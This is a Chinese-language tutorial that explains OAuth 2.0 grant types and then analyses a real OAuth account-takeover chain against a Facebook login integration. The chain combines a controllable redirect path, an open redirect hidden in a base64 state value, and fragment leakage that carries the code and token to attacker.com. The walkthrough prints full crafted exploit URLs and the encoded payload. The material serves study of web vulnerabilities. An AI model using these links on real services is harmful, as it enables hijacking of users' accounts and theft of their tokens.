### OAuth2.0的介绍

介绍：OAuth 2.0 是一套关于授权的行业标准协议。OAuth 2.0 **允许用户授权第三方应用访问他们在另一个服务提供方上的数据**，而无需分享他们的凭据（如用户名、密码）。

OAuth2.0定义了多种授权方式（grant types），每种方式适用于不同的应用场景和安全需求。以下是OAuth2.0中常见的几种授权方式：

1. 授权码模式
2. 隐式授权模式
3. 密码模式
4. 客户端凭证模式
5. 刷新令牌

#### 隐式授权

![image-20240618193534575](./images/image-20240618193534575.png)

1. 在Randomsite.com选择使用Facebook登录
2. Randomsite.com 将打开Facebook的新窗口。
3. 如果这是您第一次使用 Randomsite.com，Facebook 会要求您给予许可。否则，Facebook 将自动对您进行身份验证。

​       ![image-20240618193607870](./images/image-20240618193607870.png)                    

4. 点击“继续以约翰身份”后，脸书将生成一个秘密令牌。此令牌对 Randomsite.com 是私有的，并与您的 Facebook 个人资料相关联。
5. Facebook使用此令牌将您重定向回 Randomsite.com。
6. Randomsite.com 使用该令牌直接与Facebook交谈以获取您的电子邮件地址。
7. Facebook批准这确实 john@gmail.com，Randomsite.com 可以登录他。

![image-20240618193817336](./images/image-20240618193817336.png)

* 在步骤 2-3 中：约翰点击Facebook登录后，Randomsite.com 会打开一个新窗口，指向以下地址：https://www.facebook.com/v3.0/dialog/oauth？redirect_uri=https：//randomsite.com/OAuth&scope=email&client_id=1501&state=[random_value]&response_type=token.请注意redirect_uri参数 - 它告诉Facebook在步骤4-5中将令牌发送到何处。

* 在步骤 4-5 中：Facebook为 Randomsite.com 准备了一个秘密令牌（client_id参数告诉Facebook请求来自 randomsite.com），并将您的浏览器重定向回redirect_uri。确切的重定向：https://randomsite.com/OAuth#token=[secret_token]]&state=[Random_Value]

* 在步骤 6-7 中：Randomsite.com 从URL读取令牌，并使用以下API使用它直接与Facebook通信：https://graph.facebook.com/me?fields=id,name,email&access_token=[secret_token]。响应是 john@gmail.com。

#### 授权码模式

* 授权码模式和隐式授权非常类似，唯一不同的是，隐式模式下，Randomsite.com直接将第五步中获取的token作为与访问facebook资源的凭证，而在授权码模式下，Randomsite.com需要将token向facebook兑换为访问令牌，之后Randomsite.com再使用访问令牌访问facebook的资源
* 为什么授权码模式的安全性更高？GPT和许多博客给出的回答：

> 授权码模式更安全，因为令牌交换发生在服务器端。隐式授权模式由于令牌在浏览器中传输，安全性较低。

​    在设计上，授权码模式的token或者code是一次性，即使，code被泄露或窃取，它们也几乎不可能被利用，除非它们是被截获的（后文例子）。

#### 其他模式的简介

* 密码模式：和一般的密码登录类似，只不过校验账户密码的不是客户访问的站点A，而是一个认证服务器B，一般来说，站带A和认证服务器同属同一公司或组织

![c0ea53bc25bd2f63f351ccf2eaaf460d](./images/c0ea53bc25bd2f63f351ccf2eaaf460d.png)

* 客户端凭证模式：客户端模式主要用于没有用户参与的后端服务，如开放API的场景

![5266b985b0265d72cf4129fe84522ab9](./images/5266b985b0265d72cf4129fe84522ab9.png)

* 刷新令牌模式：将长期有效的令牌分为了类似jwt中常用的长令牌和短令牌

### 一个真实的OAuth2.0漏洞

这是一个授权码模式的例子

![img](./images/09635c1f9cc219271e022f6eecd33905.png)

与前面OAuth介绍中的隐式授权相对比，多了授权码模式的步骤6-7，步骤6-7使用Facebook API将代码与令牌交换：

![img](./images/ec71c5ccfd1449ee21661332813c6155.png)

#### 缺陷一——可控的重定向路径

当用户在Randomsite.com点击使用Facebook登录时，链接指向：`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/social/result/facebook&scope=email&client_id=210068525731476&state=[large_object]&response_type=code`

其中`https://www.facebook.com/v3.0/dialog/oauth`是Facebook认证的界面，而redirect=参数则是认证后跳转回的url。

redirect=参数中，域名往往是被严格控制的，这很好理解，为了防止url跳转漏洞，Facebook可能会对请求`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/social/result/facebook&scope=email&client_id=210068525731476&state=[large_object]&response_type=code`时的referer进行校验，或者更为严格的是，redirect要跳转的域名与client_id做一个绑定，client_id都是在Facebook注册过的合法、安全的站点。

但是`redirect=https://domian.com/path/`的路径可能是不做严格限制的，所以我们可以将链接修改为`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/any/path/attacker/wants&scope=email&client_id=210068525731476&state=[large_object]&response_type=code`,这一修改会导致，我们在`www.facebook.com`允许登录后，跳转到`https://account.booking.com/any/path/attacker/wants?code=`下，**跳转的站点不可控，但是路径可控，而且携带着我们可能感兴趣的code参数**

#### 缺陷二——开放重定向漏洞（url跳转漏洞）

在Randomsite.com的站内，发现了一处url跳转漏洞，即`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback?response_type=code&state=eyJteXNldHRpbmdzX3BhdGgiOiIvbXlzZXR0aW5ncy9wZXJzb25hbCIsImFpZCI6IjEyMyJ9`，该链接会将用户重定向到`https://account.booking.com/mysettings/personal`，这是因为参数state的缘故，state是base64编码的字符串，解码后为

```json
{"mysettings_path":"/mysettings/personal","aid":"123"}
```

所以，我们可以构造state参数`eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ`

```json
{"mysettings_path":"https://attacker.com/index.php","aid":"123"}
```

#### 结合缺陷一二获取code

我们构造如下链接发送给受害者`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&scope=email&response_type=code&client_id=210068525731476`

注意我们如何利用了缺陷一二，一我们更改了通过Facebook认证后的跳转路径，将安全路径`/social/result/facebook`替换为了存在url跳转漏洞的`/oauth2/authorize`，我们再利用url跳转漏洞，将参数state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMif指向攻击者所控制的恶意链接。

理想的攻击情景是，用户点击我们发送的恶意链接，进入Facebook的授权登录界面，用户授权后，url中携带攻击者感兴趣的code跳转到存在url跳转漏洞的`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&code=666666`，紧接着又因为url跳转漏洞跳转到了state所指向的恶意站点。

这里有一个小trick，重定向一般不会携带查询参数（具体得看后端实现），所以我们链接中的&code=666666可能不会被携带向`https://attacker.com/index.php`发起请求，如何解决这个问题呢？关键在于facebook授权登录url中的参数`response_type=`，将其由`response_type=code`更改为`response_type=code, token`，这会使得Facebook不通过参数发送code，而是通过一个标识片段传递，即`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ#code=[secret_code]&access_token=[token]`,url重定向时会携带这个片段标识符

所以，我们更改最初的链接为`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code, token;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&scope=email&response_type=code&client_id=210068525731476`，用户点击后，最终跳转到如下请求`https://attacker.com/index.php#code=[secret_code]&access_token=[token]`，攻击者就拦截窃取了code

#### 对于code的利用

* 向受害者发送刚刚构造的链接
* 受害者点击链接，攻击者窃取code

![img](./images/09635c1f9cc219271e022f6eecd33905.png)

* 攻击者尝试登录，并拦截步骤五中的报文，将自己的code替换为窃取的code
* 攻击者使用受害者的code登陆成功

上面的步骤是理想情况，事实上，在这个真实存在的漏洞中，这个方法是不可行的，这是因为Facebook提供的api做了限制，在第六步中，Randomsite.com向Facebook发起了如下请求：

![img](./images/2c97eacf7cd4f48ee919436f883b716a.png)

这个请求要求redirect_uri保持和启动OAuth登录过程时的原始参数一致，也就是说第五步中的url?code=666666，url必须和获取code=666666的redirect_url一致，在前面的例子中，即是`redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code, token;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ`，但是这是不可能做到的，因为攻击者也必须通过`/social/result/facebook`登录

#### 结合新的漏洞

在Randomsite.com的移动APP上发现了一个漏洞：

![img](./images/943f584a232b26d115142542d26a90fc.png)

这个请求可以看做代替了步骤五，但是多此一举的是，向Facebook请求访问令牌时，参数redirect_uri不是从步骤五的请求url获取，而是从post body中的参数resultUri获取，这就意味着攻击者可以改变resultUri使得redirect_uri与窃取到的code相匹配。

### PortSwigger靶场